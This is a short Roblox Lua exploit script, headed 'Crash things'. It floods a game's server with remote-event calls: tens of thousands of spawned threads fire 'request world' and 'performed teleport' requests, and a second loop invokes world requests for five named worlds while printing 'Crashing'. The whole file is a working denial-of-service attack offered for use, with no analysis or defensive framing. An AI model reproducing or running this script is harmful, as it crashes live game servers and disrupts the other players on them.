do--//Crash things
Library = require(game:GetService('ReplicatedStorage').Framework.Library)
function Death()
spawn(function()
Library.Network.Fire('request world', "Fantasy")
Library.Network.Fire('performed teleport')
end)
spawn(function()
Library.Network.Fire('request world', "Tech")
Library.Network.Fire('performed teleport')
end)
end
for i=1,15000 do
spawn(function()
Death()
end)
end
end

local lib = require(game.ReplicatedStorage.Framework.Library)
spawn(function()
    for i=1,2300  do
        print("Crashing")
        task.spawn(lib.Network.Invoke, 'request world', 'Fantasy')
        task.spawn(lib.Network.Invoke, 'request world', 'Tech')
        task.spawn(lib.Network.Invoke, 'request world', 'Void')
        task.spawn(lib.Network.Invoke, 'request world', 'Axolotl')
        task.spawn(lib.Network.Invoke, 'request world', 'Pixel')
            
      end
  end)
